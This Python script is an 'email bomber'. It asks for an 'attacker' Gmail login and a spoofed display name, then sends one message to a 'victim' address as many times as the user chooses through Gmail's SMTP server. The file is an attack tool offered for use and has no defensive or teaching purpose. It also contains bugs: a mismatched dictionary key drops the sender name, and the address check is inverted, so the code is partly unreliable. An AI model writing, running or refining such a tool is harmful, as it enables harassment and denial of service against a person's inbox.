import smtplib
from email.message import EmailMessage

#
# Constants
#

smtp_server = 'smtp.gmail.com'
port = 587

class BomberOptions(object):
    def __init__(self, victim_address: str, email_subject: str) -> None:
        self.__victim_address = victim_address
        self.__email_subject = email_subject
        
    @property
    def victim_address(self) -> str:
        return self.__victim_address
    
    @victim_address.setter
    def victim_address(self, address: str) -> None:
        if not self.__is_email_address(address):
            raise ValueError('Please enter a valid victim email address')
        self.__victim_address = address
        
    @property
    def email_subject(self) -> str:
        return self.__email_subject
    
    @email_subject.setter
    def email_subject(self, subject: str) -> None:
        self.__email_subject = subject
        
    def __is_email_address(self, address: str) -> bool:
        if address.find('@') == -1:
            return False
        return address.split('@')[1].find('.') == -1

def set_config() -> dict:
    attacker_adress = input('Attacker Gmail Adress: ')
    attacker_name = input('Attacker Anonymous Name: ')
    attacker_password = input('Attacker Gmail Password: ')
    
    victim_adress = input('Victim Gmail Adress: ')
    
    email_subject = input('Email Subject: ')
    email_body = input('Email Message: ')
    email_amount = int(input('Number of emails: '))
    
    input_data = {
        'attacker_adress': attacker_adress,
        'attacker_name': attacker_name,
        'attacker_password': attacker_password,
        'victim_adress': victim_adress,
        'email_subject': email_subject,
        'email_body': email_body,
        'email_amount': email_amount
    }
    
    return input_data

def send_email(input_data: dict) -> None:
    attacker_adress = input_data.get('attacker_adress')
    attacker_name = input_data.get('attack_name')
    attacker_password = input_data.get('attacker_password')
    victim_adress = input_data.get('victim_adress')
    email_subject = input_data.get('email_subject')
    email_body = input_data.get('email_body')
    email_amount = input_data.get('email_amount')
    
    msg = EmailMessage()
    msg['Subject'] = email_subject
    msg['From'] = f'{attacker_name} <{attacker_adress}>'
    msg['To'] = victim_adress
    msg.set_content(email_body)

    server = smtplib.SMTP(smtp_server, port)
    server.ehlo()
    server.starttls()
    server.ehlo()
    server.login(attacker_adress, attacker_password)
    for i in range(email_amount):
        server.send_message(msg)
        print(f'Sent email number {i + 1}')
    server.quit()
    print('Emails have been sent successfully')

def main() -> None:
    try:
        send_email(set_config())
    except smtplib.SMTPAuthenticationError:
        print('The password doesn’t match the email, or you don’t have access enabled by less secure apps on Google')

if __name__ == '__main__':
    main()